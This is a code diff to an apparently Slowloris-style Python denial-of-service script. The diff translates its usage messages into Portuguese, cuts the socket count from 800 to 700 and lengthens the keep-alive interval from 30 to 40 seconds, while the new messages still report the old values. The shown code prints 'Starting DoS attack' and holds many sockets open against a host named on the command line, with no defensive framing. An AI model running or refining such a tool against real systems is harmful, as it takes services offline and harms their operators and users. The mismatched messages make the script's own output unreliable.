@@ -44,11 +44,13 @@ def setupSocket(ip):
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
-        print("Use it like this: python {} example.com".format(sys.argv[0]))
+        print("Os paremetros sao editaveis somente dentro do arquivo")
+        print("800 sockets variavel a 30 segundos substituicao automatica")
+        print("Use-o assim: python {} example.com".format(sys.argv[0]))
         sys.exit()
 
     ip = sys.argv[1]
-    count = 800
+    count = 700
     print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
 
     for _ in range(count):
@@ -78,4 +80,4 @@ if __name__ == "__main__":
             except socket.error:
                 break
 
-        time.sleep(30)
+        time.sleep(40)
